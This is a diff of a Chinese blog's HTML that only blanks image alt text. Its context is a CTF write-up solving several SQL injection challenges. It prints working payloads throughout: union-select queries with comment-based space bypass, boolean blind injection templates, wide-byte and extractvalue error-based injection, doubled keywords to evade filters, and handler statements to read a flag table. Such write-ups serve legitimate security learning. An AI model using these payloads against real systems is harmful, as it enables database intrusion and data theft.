@@ -53,19 +53,19 @@
 
 <p>测试后发现登录界面做了严密的防注入措施，于是注册账号</p>
 <p>登录后界面：</p>
-<p><img src="https://i.loli.net/2020/03/27/y3YFO5dUm164Vbf.png" alt="image-20200203114732943"></p>
+<p><img src="https://i.loli.net/2020/03/27/y3YFO5dUm164Vbf.png" alt=""></p>
 <p>广告申请界面：</p>
 <img src="https://i.loli.net/2020/03/27/CYufWMHk5dvQZXp.png" alt="image-20200203114757380" style="zoom:67%;" />
 
 <p>随便申请一个：</p>
-<p><img src="https://i.loli.net/2020/03/27/JdWt2SMC1DfKNvj.png" alt="image-20200203114826534"></p>
+<p><img src="https://i.loli.net/2020/03/27/JdWt2SMC1DfKNvj.png" alt=""></p>
 <p>首页显示：</p>
 <img src="D:\Blog\source\_posts\SQL注入.assets\image-20200203114846869.png" alt="image-20200203114846869" style="zoom:67%;" />
 
 <p>广告详情：</p>
-<p><img src="https://i.loli.net/2020/03/27/MrPNK86afEWqQLj.png" alt="image-20200203114909970"></p>
+<p><img src="https://i.loli.net/2020/03/27/MrPNK86afEWqQLj.png" alt=""></p>
 <p>在广告申请界面测试后发现存在SQL注入</p>
-<p><img src="https://i.loli.net/2020/03/27/RlfK1yp3mQCiV74.png" alt="image-20200203115205872"></p>
+<p><img src="https://i.loli.net/2020/03/27/RlfK1yp3mQCiV74.png" alt=""></p>
 <p>配合union查询查列数：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1'<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="string">'22</span></span><br></pre></td></tr></table></figure>
 
@@ -80,14 +80,14 @@
 </ul>
 </blockquote>
 <p>有22列，由广告详情界面显示可知，第2,3列可注入</p>
-<p><img src="https://i.loli.net/2020/03/27/E3zDiPNc7unoKsZ.png" alt="image-20200203115417817"></p>
+<p><img src="https://i.loli.net/2020/03/27/E3zDiPNc7unoKsZ.png" alt=""></p>
 <p>查数据库库，数据库版本</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1'<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">database</span>(),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="string">'22</span></span><br></pre></td></tr></table></figure>
 
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1'<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">version</span>(),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="string">'22</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.loli.net/2020/03/27/M4rw6VvsudEANGF.png" alt="image-20200203120627065"></p>
-<p><img src="https://i.loli.net/2020/03/27/bx5NetmhDY3zUsw.png" alt="image-20200203115555268"></p>
+<p><img src="https://i.loli.net/2020/03/27/M4rw6VvsudEANGF.png" alt=""></p>
+<p><img src="https://i.loli.net/2020/03/27/bx5NetmhDY3zUsw.png" alt=""></p>
 <p>查表：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1'<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(table_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>mysql.innodb_table_stats),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="string">'22</span></span><br></pre></td></tr></table></figure>
 
@@ -101,7 +101,7 @@
 <li>参考：<a href="https://www.jb51.net/article/134678.htm" target="_blank" rel="noopener">概述MySQL统计信息</a></li>
 </ul>
 </blockquote>
-<p><img src="https://i.loli.net/2020/03/27/LA2Tq1n3WSZd64r.png" alt="image-20200203121328487"></p>
+<p><img src="https://i.loli.net/2020/03/27/LA2Tq1n3WSZd64r.png" alt=""></p>
 <p>查列</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1'union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span>*<span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">users</span>),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="string">'22</span></span><br></pre></td></tr></table></figure>
 
@@ -109,12 +109,12 @@
 <p>注：无列名注入查询users表有3列，（测试时当查询users列数正确时会报不同的错误）</p>
 </blockquote>
 <p>列数错误时：</p>
-<p><img src="https://i.loli.net/2020/03/27/LH4Zv1tMgyw9nFB.png" alt="image-20200203122125088"></p>
-<p><img src="https://i.loli.net/2020/03/27/WA96BqpKjUxmkET.png" alt="image-20200203122147423"></p>
+<p><img src="https://i.loli.net/2020/03/27/LH4Zv1tMgyw9nFB.png" alt=""></p>
+<p><img src="https://i.loli.net/2020/03/27/WA96BqpKjUxmkET.png" alt=""></p>
 <p>然后再配合无列名注入注出user表中的flag</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1'union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(b)<span class="comment">/**/</span><span class="keyword">from</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>b<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span>*<span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">users</span>)x),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="string">'22</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.loli.net/2020/03/27/OVRLtoYlm12nI4i.png" alt="image-20200203122342091"></p>
+<p><img src="https://i.loli.net/2020/03/27/OVRLtoYlm12nI4i.png" alt=""></p>
 <h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="极客大挑战—HardSQL"><a href="#极客大挑战—HardSQL" class="headerlink" title="极客大挑战—HardSQL"></a>极客大挑战—HardSQL</h3><p><strong>解题核心</strong>—————–报错注入，异或(^)注入，like绕过，左右拼接</p>
 <p>界面：</p>
 <p><img src="https://i.loli.net/2020/03/27/Ep7suTQAcjo26PJ.png" style="zoom: 33%;" /><img src="D:%5CBlog%5Csource_posts%5CSQL%E6%B3%A8%E5%85%A5.assets%5Cimage-146.png" alt=""></p>
@@ -156,12 +156,12 @@
 <p>改表名使flag所在的数据库变为题目查询的数据库：rename 、alter </p>
 </blockquote>
 <p>都被过滤用不了了</p>
-<p><img src="https://i.loli.net/2020/03/27/Juin3SGqkeVxfpX.png" alt="image-20200225122608274"></p>
+<p><img src="https://i.loli.net/2020/03/27/Juin3SGqkeVxfpX.png" alt=""></p>
 <p>这里就用到了mysq的新特性<code>handler</code>，<a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html" target="_blank" rel="noopener">详</a></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">handler</span> FlagHere <span class="keyword">open</span> <span class="keyword">as</span> cool;</span><br><span class="line"></span><br><span class="line"><span class="keyword">handler</span> cool <span class="keyword">read</span> <span class="keyword">first</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">handler</span> cool <span class="keyword">read</span> <span class="keyword">next</span>;</span><br></pre></td></tr></table></figure>
 
 <p>通过以上三条语句应该就能得到flag，（比赛的时候没做出来，赛后没来得及看这题，早在一个多月前学长在群里发过这个新特性，当时太菜看不懂，现在想想可惜了 -.-）</p>
-<p><img src="https://i.loli.net/2020/03/27/7bxJWosa2PNCnRg.png" alt="image-20200225123532230"></p>
+<p><img src="https://i.loli.net/2020/03/27/7bxJWosa2PNCnRg.png" alt=""></p>
 <h3 id="2019SUCTF—EasySQL"><a href="#2019SUCTF—EasySQL" class="headerlink" title="2019SUCTF—EasySQL"></a>2019SUCTF—EasySQL</h3><p><strong>解题核心</strong>：</p>
 <ul>
 <li>堆叠注入</li>
@@ -328,7 +328,7 @@
 <img src="https://i.loli.net/2020/03/27/9WpDyf1SxXoMCrH.png" alt="image-20200224213301224" style="zoom:80%;" />
 
 <p>尝试使用弱密码，<code>1&#39; or 1=1#</code></p>
-<p><img src="https://i.loli.net/2020/03/27/tuM3g2DS8hEQ1WL.png" alt="image-20200224213403716"></p>
+<p><img src="https://i.loli.net/2020/03/27/tuM3g2DS8hEQ1WL.png" alt=""></p>
 <p>于是可以在登录界面进行布尔盲注</p>
 <p>爆库Payload：<code>2&#39; or (select (mid((select database()),{},1)))=&#39;{}&#39;#</code></p>
 <p>爆表Payload：<code>2&#39; or (select (mid((select group_concat(table_name,&#39;&#39;) from information_schema.tables where table_schema=database()),{},1)))=&#39;{}&#39;#</code></p>
@@ -339,7 +339,7 @@
 <p>得到数据库：<code>nzhaopin</code>,表：<code>backup,flag,user</code>，flag表的内容：<code>id,flaaag</code>，最终得到flag</p>
 <h3 id="CISCN2019-Web1—Hack-World"><a href="#CISCN2019-Web1—Hack-World" class="headerlink" title="CISCN2019-Web1—Hack World"></a>CISCN2019-Web1—Hack World</h3><p><strong>解题核心</strong>—————–异或注入，盲注爆破</p>
 <p>界面：</p>
-<p><img src="https://i.loli.net/2020/03/27/t2nS8YpRmGTEsx7.png" alt="image-20200210212526994"></p>
+<p><img src="https://i.loli.net/2020/03/27/t2nS8YpRmGTEsx7.png" alt=""></p>
 <p>题目给出了flag在flag表和flag列中</p>
 <p>测试后发现过滤了大多数字符，但有些还是没过滤的，于是进行sql盲注</p>
 <p>空格利用<code>()</code>绕过，配合异或注入和判断回显信息一个一个爆出字符串</p>
@@ -465,26 +465,26 @@
 
 <p>得到<code>table1</code>表中的列：<code>balabala,eih@y,fllllll4g,bbb</code>,最终在<code>fllllll4g</code>列中得到flag</p>
 <h3 id="安恒杯-新春祈福赛—BabySqliv2-0"><a href="#安恒杯-新春祈福赛—BabySqliv2-0" class="headerlink" title="安恒杯-新春祈福赛—BabySqliv2.0"></a>安恒杯-新春祈福赛—BabySqliv2.0</h3><p><strong>解题核心</strong>—————–异或注入，报错注入，宽字节注入</p>
-<p><img src="https://i.loli.net/2020/03/27/g86QP1C5ZsThjan.png" alt="image-20200202210221397"></p>
+<p><img src="https://i.loli.net/2020/03/27/g86QP1C5ZsThjan.png" alt=""></p>
 <p>界面的上题一样，发现只要用admin账号登录，无论用什么密码都能登录进去，登进去后界面如下</p>
-<p><img src="https://i.loli.net/2020/03/27/Lg3nIbUrDZ6AY4R.png" alt="image-20200202205759631"></p>
+<p><img src="https://i.loli.net/2020/03/27/Lg3nIbUrDZ6AY4R.png" alt=""></p>
 <p>于是在登录界面测试，单引号注入无效，猜测转义了单引号，利用宽字节注入，果不其然，于是利用报错注入</p>
-<p><img src="https://i.loli.net/2020/03/27/4cPp1rotWQnUvew.png" alt="image-20200202210316197"></p>
+<p><img src="https://i.loli.net/2020/03/27/4cPp1rotWQnUvew.png" alt=""></p>
 <p>文章参考：<a href="https://www.gem-love.com/websecurity/467.html" target="_blank" rel="noopener">简析GXY_CTF “BabySqli v2.0”宽字节注入</a></p>
 <p>报错注入有三种方法：floor()，extractvalue()，updatexml()，这里采用extractvalue()报错注入：</p>
 <p>查库：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%d5'^extractvalue(1,concat(1,(seselectlect(group_concat(database())))));<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.loli.net/2020/03/27/KDtnXxQcPvYRGV6.png" alt="image-20200202211050460"></p>
+<p><img src="https://i.loli.net/2020/03/27/KDtnXxQcPvYRGV6.png" alt=""></p>
 <p>查表：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%d5'^extractvalue(1,concat(1,(selselectect(group_concat(table_name))from(information_schema.tables)whewherere((table_schema)=database()))));<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.loli.net/2020/03/27/YvlyLpUX7qZESNP.png" alt="image-20200202211144570"></p>
+<p><img src="https://i.loli.net/2020/03/27/YvlyLpUX7qZESNP.png" alt=""></p>
 <p>由此可知flag应该在f14g中</p>
 <p>查字段：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%d5'^extractvalue(1,concat(1,(selselectect(group_concat(column_name))from(information_schema.columns)whwhereere((table_name)=char(102,49,52,103)))));<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.loli.net/2020/03/27/hIfBtkgzYT4qNOa.png" alt="image-20200202211316925"></p>
+<p><img src="https://i.loli.net/2020/03/27/hIfBtkgzYT4qNOa.png" alt=""></p>
 <blockquote>
 <p>注：这里应该是过滤了列的直接查询，用char()函数进行绕过即可</p>
 </blockquote>
@@ -492,28 +492,28 @@
 <p>id列查询：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%d5'^extractvalue(1,concat(1,(selselectect group_concat(b80bb7740288fda1f201890375a60c8f) from f14g)))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.loli.net/2020/03/27/9wQR4Un3pDref1W.png" alt="image-20200202213216347"></p>
+<p><img src="https://i.loli.net/2020/03/27/9wQR4Un3pDref1W.png" alt=""></p>
 <p>还真全是id了，看大佬博客后发现居然还可以盲猜flag？？？</p>
 <p>flag的MD5值为327a6c4304ad5938eaf0efb6cc3e53dc</p>
 <p>flag列查询：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%d5'^extractvalue(1,concat(1,(selselectect concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g)))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.loli.net/2020/03/27/xoZzpbPdajKuqD3.png" alt="image-20200202213850482"></p>
+<p><img src="https://i.loli.net/2020/03/27/xoZzpbPdajKuqD3.png" alt=""></p>
 <p>base64解密后为“The first man name was k”。。。。。。。。。。</p>
 <p>配合limit进行查询，在limit 22,1处发现flag</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%d5'^extractvalue(1,concat(1,(selselectect concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 22,1)))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.loli.net/2020/03/27/PXqxeEV3Hvp7cRw.png" alt="image-20200202215549648"></p>
+<p><img src="https://i.loli.net/2020/03/27/PXqxeEV3Hvp7cRw.png" alt=""></p>
 <p>解码后只显示前面的flag，应该是前端界面限制了字符串的显示</p>
 <p>于是用到substr()函数进行字符串的截取：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%d5'^extractvalue(1,concat(1,substr((selselectect concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 22,1),10,32)))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.loli.net/2020/03/27/Qo3SelyJVt6qbkM.png" alt="image-20200202215649430"></p>
+<p><img src="https://i.loli.net/2020/03/27/Qo3SelyJVt6qbkM.png" alt=""></p>
 <p>去掉相同的拼合起来base64解码后即可得到flag</p>
 <h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><h3 id="安恒杯-新春祈福赛—BabySqli"><a href="#安恒杯-新春祈福赛—BabySqli" class="headerlink" title="安恒杯-新春祈福赛—BabySqli"></a>安恒杯-新春祈福赛—BabySqli</h3><p><strong>解题核心</strong>—————–MD5绕过</p>
-<p><img src="https://i.loli.net/2020/03/27/FUeKLit8HApfNOP.png" alt="image-20200202202456358"></p>
+<p><img src="https://i.loli.net/2020/03/27/FUeKLit8HApfNOP.png" alt=""></p>
 <p>题目给出的提示：</p>
-<p><img src="https://i.loli.net/2020/03/27/53qyMpFJAaSEcBz.png" alt="image-20200202202740164"></p>
+<p><img src="https://i.loli.net/2020/03/27/53qyMpFJAaSEcBz.png" alt=""></p>
 <p>随便登录后在前端HTML中都能看到这样一串字母</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span></span><br></pre></td></tr></table></figure>
 
